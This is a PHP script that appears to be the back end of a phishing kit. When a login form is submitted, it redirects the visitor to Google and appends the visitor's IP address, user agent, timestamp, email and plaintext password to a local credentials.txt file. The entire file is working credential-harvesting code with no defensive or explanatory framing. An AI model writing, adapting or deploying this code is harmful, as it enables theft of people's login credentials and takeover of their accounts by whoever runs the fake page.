<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header("location: https://www.google.com/");
    $handle = fopen("./credentials.txt", "a");
    date_default_timezone_set("Asia/Kolkata");
	
	if (!empty($_SERVER['HTTP_CLIENT_IP']))
    { $ipaddress = $_SERVER['HTTP_CLIENT_IP']; }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    { $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; }
    else { $ipaddress = $_SERVER['REMOTE_ADDR']; }
	
	fwrite($handle, "IP");
    fwrite($handle, "       =  ");
    fwrite($handle, $ipaddress);
    fwrite($handle, "\n");
	
    fwrite($handle, "UA");
    fwrite($handle, "       =  ");
    fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
    fwrite($handle, "\n");
	
    fwrite($handle, "Time");
    fwrite($handle, "     =  ");
    fwrite($handle, date("d-m-Y h:i:sa"));
    fwrite($handle, "\n");
	
    $email = $_POST["email"];
	fwrite($handle, "Email");
    fwrite($handle, "    =  ");
    fwrite($handle, $email);
    fwrite($handle, "\n");
	
	$password = $_POST["password"];
	fwrite($handle, "Password");
    fwrite($handle, " =  ");
    fwrite($handle, $password);
    fwrite($handle, "\n");
	
    fwrite($handle, "\n");
    fclose($handle);
    exit;
}
session_destroy();
?>